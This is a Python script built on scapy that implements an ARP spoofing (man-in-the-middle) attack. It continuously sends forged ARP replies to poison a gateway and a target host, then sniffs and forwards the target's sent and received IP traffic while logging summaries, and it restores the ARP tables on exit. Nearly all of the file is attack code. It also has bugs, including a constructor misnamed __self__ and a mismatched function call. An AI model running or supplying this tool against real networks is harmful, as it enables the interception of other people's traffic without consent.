import colorama, time, sys, subprocess, threading
from scapy.all import *

class Spoof:
	import threading
	stop = threading.Event()

	def __self__(self, interface, interval, source, gateway, target, sourcemac, gatewaymac, targetmac):
		self.interface = interface
		self.interval = interval

		self.source = source
		self.gateway = gateway
		self.target = target

		self.sourcemac = sourcemac
		self.gatewaymac = gatewaymac
		self.targetmac = targetmac

	def GetMAC(self, destination, timeout):
		request = ARP(op=1, pdst=destination)
		response = sr1(request, timeout=timeout, verbose=False)

		if response:
			return response.hwsrc
		return None

	def Reset(self):
		gateway_packet = ARP(op=2, psrc=self.gateway, pdst=self.target, hwsrc=self.gatewaymac, hwdst=self.targetmac)
		target_packet = ARP(op=2, psrc=self.target, pdst=self.gateway, hwsrc=self.targetmac, hwdst=self.gatewaymac)

		send(gateway_packet, count=1, verbose=False)
		send(target_packet, count=1, verbose=False)

		PrintMessage(f"({gateway_packet.summary()} : {target_packet.summary()})")
		PrintMessage("Exiting gracefully.")
		sys.exit()

	def Spoof(self):
		gateway_packet = Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(op=2, psrc=self.gateway, pdst=self.target, hwsrc=self.sourcemac, hwdst=self.targetmac)
		target_packet = Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(op=2, psrc=self.target, pdst=self.gateway, hwsrc=self.sourcemac, hwdst=self.gatewaymac)

		while True:
			send(gateway_packet, count=1, verbose=False)
			send(target_packet,  count=1, verbose=False)

			time.sleep(self.interval)

	def ForwardSent(self):
		while True:
			packet = sniff(filter="ip", count=1)[0]

			if not packet.haslayer(IP): continue

			if packet[IP].src == self.target:
				PrintMessage(f"(Sent) {packet.summary()}")
				send(packet, count=1, verbose=False)

			time.sleep(self.interval)

	def ForwardReceived(self):
		while True:
			packet = sniff(filter="ip", count=1)[0]

			if not packet.haslayer(IP): continue

			if packet[IP].dst == self.target:
				PrintMessage(f"(Received) {packet.summary()}", 0)
				send(packet, count=1, verbose=False)

			time.sleep(self.interval)

def CheckFields(fields):
		for field in fields:
			if not field: return False
		return True

def ValidateFlags(flags, required):
	for flag in required:
		if flag not in flags:
			return False
	return True

def PopulateFields(parameters):
	for argument in range(0, len(sys.argv)):
		match sys.argv[argument]:
			case '-s':
				parameters["Source"] = sys.argv[argument + 1]
			case '-g':
				parameters["Gateway"] = sys.argv[argument + 1]
			case '-t':
				parameters["Target"] = sys.argv[argument + 1]
			case '-i':
				parameters["Interface"] = sys.argv[argument + 1]
	return parameters

def PrintHelp(message):
	print(message)
	sys.exit()

def PrintMessage(message):
	print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{colorama.Style.RESET_ALL}*{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")